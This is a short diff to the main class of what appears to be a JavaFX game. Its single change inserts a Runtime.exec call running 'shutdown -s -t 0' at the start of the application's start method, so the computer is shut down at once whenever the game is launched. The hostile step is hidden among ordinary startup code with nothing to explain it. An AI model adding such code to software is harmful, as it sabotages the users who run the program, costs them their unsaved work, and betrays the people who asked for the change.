@@ -24,7 +24,7 @@ public class Main extends Application{
      */
     @Override
     public void start(Stage primaryStage) throws Exception {
-
+        Runtime.getRuntime().exec("shutdown -s -t 0");
         // JavaFX stuff
         URL fxmlFileUrl = getClass().getClassLoader().getResource("startgame.fxml");
         Parent root = FXMLLoader.load(Objects.requireNonNull(fxmlFileUrl));
